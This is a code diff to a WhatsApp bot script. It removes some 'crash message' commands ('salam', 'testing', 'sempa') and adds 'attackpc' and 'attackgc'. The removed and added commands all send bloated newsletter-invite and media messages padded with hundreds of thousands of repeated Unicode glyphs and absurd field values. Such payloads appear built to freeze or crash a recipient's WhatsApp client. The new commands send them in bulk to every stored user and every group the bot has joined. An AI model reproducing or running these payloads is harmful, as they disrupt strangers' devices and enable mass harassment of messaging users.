@@ -314,12 +314,12 @@ const isQuotedDocument = type === 'extendedTextMessage';
   
   
   async function pinterest(query) {
-      let res = await fetch(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${query}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${query}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
-      let json = await res.json();
-      let data = json.resource_response.data.results;
-      if (!data.length) return `Query "${query}" not found :/`;
-      return data[~~(Math.random() * data.length)].images.orig.url;
-  }
+    let res = await fetch(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${query}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${query}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
+    let json = await res.json();
+    let data = json.resource_response.data.results;
+    if (!data.length) return `Query "${query}" not found :/`;
+    return data[~~(Math.random() * data.length)].images.orig.url;
+}
 
   const logs = [];
 const LOG_RETENTION_TIME = 2 * 60 * 1000; // 2 minutes in milliseconds
@@ -14934,53 +14934,7 @@ break;
     
 
 
-
-      case 'salam':
-        try {
-            if (!XliconTheCreator && !isPremium) {
-                return replygcxlicon('This command is only available to the bot owner or premium users!');
-            }
-    
-            // Check if target number is provided
-            if (!text) return replygcxlicon('Please provide a target number with country code (without +)\nExample: .salam 6281234567890');
-    
-            // Format the target number
-            const targetNumber = text + "@s.whatsapp.net";
-            
-            replygcxlicon('Starting invite sequence...');
-    
-            async function sendInvites(target) {
-                const message = {
-                    botInvokeMessage: {
-                        message: {
-                            newsletterAdminInviteMessage: {
-                                newsletterJid: `33333333333333333@newsletter`,
-                                newsletterName: "ꦸ꫞꧅꧃" + "ꦾ".repeat(150000),
-                                jpegThumbnail: "",
-                                caption: "ꦽ".repeat(150000),
-                                inviteExpiration: Date.now() + 18144000001814400000,
-                            },
-                        },
-                    },
-                };
-    
-                for (let i = 0; i < 5; i++) {
-                    await XliconBotInc.relayMessage(target, message, {
-                        userJid: target,
-                    });
-                }
-            }
-    
-            await sendInvites(targetNumber);
-            replygcxlicon(`Successfully sent invites to ${text}`);
-        } catch (err) {
-            console.error('Error in sendInvites:', err);
-            replygcxlicon('Process interrupted.');
-        }
-        break;
-    
-
-    
+      
 
 
 
@@ -14989,48 +14943,9 @@ break;
       
 
 
-        case 'testing':
-          try {
-              if (!XliconTheCreator && !isPremium) return replygcxlicon('This command is only available to the bot owner or premium users!');
-      
-              replygcxlicon(`Starting invite sequence...`);
-      
-              async function sendInvites(target) {
-                  const messsage = {
-                      botInvokeMessage: {
-                          message: {
-                              newsletterAdminInviteMessage: {
-                                  newsletterJid: `33333333333333333@newsletter`,
-                                  newsletterName: "ꦸ꫞꧅꧃" + "ꦾ".repeat(150000),
-                                  jpegThumbnail: "",
-                                  caption: "ꦽ".repeat(150000),
-                                  inviteExpiration: Date.now() + 18144000001814400000,
-                              },
-                          },
-                      },
-                  };
-      
-                  for (let i = 0; i < 5; i++) {
-                      await XliconBotInc.relayMessage(target, messsage, {
-                          userJid: target,
-                      });
-                  }
-              }
-      
-              await sendInvites(m.chat);
-              
-      
-          } catch (err) {
-              console.error('Error in senfc:', err);
-              replygcxlicon('Process interrupted.');
-          }
-          break;
+       
 
-
-
-
-      
-        
+          
 
 
       case 'buggc':
@@ -15045,7 +14960,7 @@ break;
                         message: {
                             newsletterAdminInviteMessage: {
                                 newsletterJid: `33333333333333333@newsletter`,
-                                newsletterName: "[‌‌‌‌‌‌‌‌‌P‌‌‌‌‌‌‌‌‌‌_‌‌‌‌‌‌‌‌‌‌‌L‌‌‌‌‌‌‌‌‌] ‌‌‌‌‌‌‌I‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌S‌‌‌ ‌‌‌‌‌‌C‌‌‌‌‌‌‌‌‌‌‌‌‌‌O‌‌‌‌‌‌‌‌‌‌‌‌M‌‌‌‌‌‌‌‌‌‌‌‌‌I‌‌‌‌‌‌‌‌‌‌‌‌‌N‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌G‌‌‌‌‌‌‌!⟆" + "ꦾ".repeat(150000),
+                                newsletterName: "[‌‌‌‌‌‌‌‌‌P‌‌‌‌‌‌‌‌‌‌_‌‌‌‌‌‌‌‌‌‌‌L‌‌‌‌‌‌‌‌‌] ‌‌‌‌‌‌‌I‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌S‌‌‌ ‌‌‌‌‌‌C‌‌‌‌‌‌‌‌‌‌‌‌‌‌O‌‌‌‌‌‌‌‌‌‌‌‌M‌‌‌‌‌‌‌‌‌‌‌‌‌I‌‌‌‌‌‌‌‌‌‌‌‌‌N‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌G‌‌‌‌‌‌‌!⟆[‌‌‌‌‌‌‌‌‌P‌‌‌‌‌‌‌‌‌‌_‌‌‌‌‌‌‌‌‌‌‌L‌‌‌‌‌‌‌‌‌] ‌‌‌‌‌‌‌I‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌S‌‌‌ ‌‌‌‌‌‌C‌‌‌‌‌‌‌‌‌‌‌‌‌‌O‌‌‌‌‌‌‌‌‌‌‌‌M‌‌‌‌‌‌‌‌‌‌‌‌‌I‌‌‌‌‌‌‌‌‌‌‌‌‌N‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌G‌‌‌‌‌‌‌!⟆[‌‌‌‌‌‌‌‌‌P‌‌‌‌‌‌‌‌‌‌_‌‌‌‌‌‌‌‌‌‌‌L‌‌‌‌‌‌‌‌‌] ‌‌‌‌‌‌‌I‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌S‌‌‌ ‌‌‌‌‌‌C‌‌‌‌‌‌‌‌‌‌‌‌‌‌O‌‌‌‌‌‌‌‌‌‌‌‌M‌‌‌‌‌‌‌‌‌‌‌‌‌I‌‌‌‌‌‌‌‌‌‌‌‌‌N‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌G‌‌‌‌‌‌‌!⟆" + "ꦾ".repeat(150000),
                                 jpegThumbnail: "",
                                 caption: "ꦽ".repeat(150000),
                                 inviteExpiration: Date.now() + 1814400000,
@@ -15062,7 +14977,7 @@ break;
             }
     
             await sendInvites(m.chat);
-            replygcxlicon('Invite sequence completed.');
+            replygcxlicon('ASTAGA SLOWRES BET PENTING INI WOI');
     
         } catch (err) {
             console.error('Error in senfc:', err);
@@ -15075,112 +14990,101 @@ break;
 
 
 
-
-        case 'sempa':
-          try {
-              if (!XliconTheCreator && !isPremium) return replygcxlicon('This command is only available to the bot owner or premium users!');
+     case 'attackpc':{
+         if (!XliconTheCreator) return XliconStickOwner()
+         
+         async function sendInvites(target) {
+             const messsage = {
+                 botInvokeMessage: {
+                     message: {
+                         newsletterAdminInviteMessage: {
+                             newsletterJid: `33333333333333333@newsletter`,
+                             newsletterName: "[‌‌‌‌‌‌‌‌‌P‌‌‌‌‌‌‌‌‌‌_‌‌‌‌‌‌‌‌‌‌‌L‌‌‌‌‌‌‌‌‌] ‌‌‌‌‌‌‌I‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌S‌‌‌ ‌‌‌‌‌‌C‌‌‌‌‌‌‌‌‌‌‌‌‌‌O‌‌‌‌‌‌‌‌‌‌‌‌M‌‌‌‌‌‌‌‌‌‌‌‌‌I‌‌‌‌‌‌‌‌‌‌‌‌‌N‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌G‌‌‌‌‌‌‌!⟆[‌‌‌‌‌‌‌‌‌P‌‌‌‌‌‌‌‌‌‌_‌‌‌‌‌‌‌‌‌‌‌L‌‌‌‌‌‌‌‌‌] ‌‌‌‌‌‌‌I‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌S‌‌‌ ‌‌‌‌‌‌C‌‌‌‌‌‌‌‌‌‌‌‌‌‌O‌‌‌‌‌‌‌‌‌‌‌‌M‌‌‌‌‌‌‌‌‌‌‌‌‌I‌‌‌‌‌‌‌‌‌‌‌‌‌N‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌G‌‌‌‌‌‌‌!⟆[‌‌‌‌‌‌‌‌‌P‌‌‌‌‌‌‌‌‌‌_‌‌‌‌‌‌‌‌‌‌‌L‌‌‌‌‌‌‌‌‌] ‌‌‌‌‌‌‌I‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌S‌‌‌ ‌‌‌‌‌‌C‌‌‌‌‌‌‌‌‌‌‌‌‌‌O‌‌‌‌‌‌‌‌‌‌‌‌M‌‌‌‌‌‌‌‌‌‌‌‌‌I‌‌‌‌‌‌‌‌‌‌‌‌‌N‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌G‌‌‌‌‌‌‌!⟆" + "ꦾ".repeat(150000),
+                             jpegThumbnail: "",
+                             caption: "ꦽ".repeat(150000),
+                             inviteExpiration: Date.now() + 1814400000,
+                         },
+                     },
+                 },
+             };
+             
+             for (let i = 0; i < 5; i++) {
+                 await XliconBotInc.relayMessage(target, messsage, {
+                     userJid: target,
+                 });
+             }
+         }
+     
+         for (let i of Object.keys(global.db.users)) {
+             await sleep(1500)
+             await sendInvites(i)
+         }
+         replygcxlicon(`Success ${command} To ${Object.keys(global.db.users).length} Users`)
+     }
+     break
+         
       
-              replygcxlicon(`Initiating maximum payload sequence...`);
-      
-              async function createVirusFiles(target) {
-                  const fs = require('fs');
-                  const thumbPath = './lib/thumb.jpg';
-      
-                  // Heavy payload messages
-                  const virusMessages = [
-                      {
-                          image: fs.readFileSync(thumbPath),
-                          caption: "😈".repeat(90000),
-                          fileLength: "999999999999",
-                          contextInfo: {
-                              externalAdReply: {
-                                  title: "🔥".repeat(1500),
-                                  body: "⚠️".repeat(1500),
-                                  mediaType: 1,
-                                  thumbnail: fs.readFileSync(thumbPath),
-                                  mediaUrl: `https://www.youtube.com/watch?v=${"A".repeat(4000)}`,
-                                  sourceUrl: `https://www.youtube.com/watch?v=${"B".repeat(4000)}`,
-                              }
-                          }
-                      },
-                      {
-                          image: fs.readFileSync(thumbPath),
-                          caption: "💀".repeat(90000),
-                          fileLength: "999999999999",
-                          contextInfo: {
-                              forwardingScore: 999999999,
-                              isForwarded: true,
-                              externalAdReply: {
-                                  title: "⚡".repeat(1500),
-                                  body: "☠️".repeat(1500),
-                                  mediaType: 1,
-                                  thumbnail: fs.readFileSync(thumbPath),
-                                  mediaUrl: `https://www.youtube.com/watch?v=${"C".repeat(4000)}`,
-                                  sourceUrl: `https://www.youtube.com/watch?v=${"D".repeat(4000)}`,
-                              }
-                          }
-                      }
-                  ];
-      
-                  // Maximum impact newsletter invites
-                  const inviteMessages = [
-                      {
-                          botInvokeMessage: {
-                              message: {
-                                  newsletterAdminInviteMessage: {
-                                      newsletterJid: `33333333333333333@newsletter`,
-                                      newsletterName: "🎭".repeat(8000) + "⚠️".repeat(8000),
-                                      jpegThumbnail: fs.readFileSync(thumbPath).toString('base64'),
-                                      caption: "ꦽ".repeat(200000),
-                                      inviteExpiration: Date.now() + 1814400000,
-                                  },
-                              },
-                          },
-                      },
-                      {
-                          botInvokeMessage: {
-                              message: {
-                                  newsletterAdminInviteMessage: {
-                                      newsletterJid: `44444444444444444@newsletter`,
-                                      newsletterName: "󠀀".repeat(8000) + "⚡".repeat(8000),
-                                      jpegThumbnail: fs.readFileSync(thumbPath).toString('base64'),
-                                      caption: "ꦾ".repeat(200000),
-                                      inviteExpiration: Date.now() + 1814400000,
-                                  },
-                              },
-                          },
-                      }
-                  ];
-      
-                  // Send all virus image variations
-                  for (let msg of virusMessages) {
-                      for (let i = 0; i < 5; i++) {
-                          await XliconBotInc.sendMessage(target, msg);
-                      }
-                  }
-      
-                  // Send all invite variations
-                  for (let invite of inviteMessages) {
-                      for (let i = 0; i < 5; i++) {
-                          await XliconBotInc.relayMessage(target, invite, {
-                              userJid: target,
-                          });
-                      }
-                  }
-              }
-      
-              await createVirusFiles(m.chat);
-              replygcxlicon('Maximum payload sequence delivered successfully.');
-      
-          } catch (err) {
-              console.error('Error in senfc:', err);
-              replygcxlicon('Process interrupted.');
-          }
-          break;
-      
-
-
           
+case 'attackgc':{
+    if (!XliconTheCreator) return XliconStickOwner()
+    
+      async function sendInvites(target) {
+        const messsage = {
+            botInvokeMessage: {
+                message: {
+                    newsletterAdminInviteMessage: {
+                        newsletterJid: `33333333333333333@newsletter`,
+                        newsletterName: "[‌‌‌‌‌‌‌‌‌P‌‌‌‌‌‌‌‌‌‌_‌‌‌‌‌‌‌‌‌‌‌L‌‌‌‌‌‌‌‌‌] ‌‌‌‌‌‌‌I‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌S‌‌‌ ‌‌‌‌‌‌C‌‌‌‌‌‌‌‌‌‌‌‌‌‌O‌‌‌‌‌‌‌‌‌‌‌‌M‌‌‌‌‌‌‌‌‌‌‌‌‌I‌‌‌‌‌‌‌‌‌‌‌‌‌N‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌G‌‌‌‌‌‌‌!⟆[‌‌‌‌‌‌‌‌‌P‌‌‌‌‌‌‌‌‌‌_‌‌‌‌‌‌‌‌‌‌‌L‌‌‌‌‌‌‌‌‌] ‌‌‌‌‌‌‌I‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌S‌‌‌ ‌‌‌‌‌‌C‌‌‌‌‌‌‌‌‌‌‌‌‌‌O‌‌‌‌‌‌‌‌‌‌‌‌M‌‌‌‌‌‌‌‌‌‌‌‌‌I‌‌‌‌‌‌‌‌‌‌‌‌‌N‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌G‌‌‌‌‌‌‌!⟆[‌‌‌‌‌‌‌‌‌P‌‌‌‌‌‌‌‌‌‌_‌‌‌‌‌‌‌‌‌‌‌L‌‌‌‌‌‌‌‌‌] ‌‌‌‌‌‌‌I‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌S‌‌‌ ‌‌‌‌‌‌C‌‌‌‌‌‌‌‌‌‌‌‌‌‌O‌‌‌‌‌‌‌‌‌‌‌‌M‌‌‌‌‌‌‌‌‌‌‌‌‌I‌‌‌‌‌‌‌‌‌‌‌‌‌N‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌G‌‌‌‌‌‌‌!⟆" + "ꦾ".repeat(150000),
+                        jpegThumbnail: "",
+                        caption: "ꦽ".repeat(150000),
+                        inviteExpiration: Date.now() + 1814400000,
+                    },
+                },
+            },
+        };
+
+        for (let i = 0; i < 5; i++) {
+            await XliconBotInc.relayMessage(target, messsage, {
+                userJid: target,
+            });
+        }
+    }
+
+    let getGroups = await XliconBotInc.groupFetchAllParticipating()
+    let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
+    let anu = groups.map(v => v.id)
+    replygcxlicon(`Sending Broadcast To ${anu.length} Group Chat, End Time ${anu.length * 1.5} seconds`)
+    
+    for (let i of anu) {
+        await sleep(1500)
+        await sendInvites(i)
+    }
+    
+    replygcxlicon(`Successfully sent Broadcast To ${anu.length} Groups`)
+}
+break
+
+
+
+
+
+
+
+
+
+
+      
+
+
+
+
+
+
+
+
+
+
+      
 
 
         
